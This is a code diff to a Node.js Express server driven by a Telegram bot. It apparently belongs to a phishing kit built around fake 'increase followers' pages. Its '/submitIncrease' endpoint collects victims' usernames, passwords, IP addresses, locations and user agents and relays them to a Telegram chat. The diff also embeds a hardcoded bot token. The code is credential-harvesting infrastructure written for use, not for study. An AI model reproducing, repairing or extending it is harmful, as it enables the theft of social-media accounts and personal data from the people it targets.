@@ -4,6 +4,7 @@ const bodyParser = require('body-parser');
 const multer = require('multer');
 const fs = require('fs');
 const path = require('path');
+const useragent = require('useragent');
 
 const botToken = '7252078284:AAFt6ySoKDAJx-6wbg435qnU-_ramrgRL8Y';
 const bot = new TelegramBot(botToken, { polling: true });
@@ -196,12 +197,6 @@ IP: ${additionalData.ip}
     }
 });
 
-app.get('/:platform/:chatId', (req, res) => {
-    const { platform, chatId } = req.params;
-    res.sendFile(path.join(__dirname, 'src', `${platform}_increase.html`));
-});
-
-// Endpoint to handle increase followers data
 app.post('/submitIncrease', (req, res) => {
     const { username, password, platform, chatId, ip, country, city, userAgent } = req.body;
 
@@ -229,9 +224,8 @@ app.post('/submitIncrease', (req, res) => {
         .catch(error => {
             console.error('Error sending message:', error);
             res.status(500).json({ error: 'Failed to send increase data', details: error.message });
-        }
+        });
 });
-
 
 // أوامر البوت
 bot.onText(/\/sjgd (\d+)/, (msg, match) => {
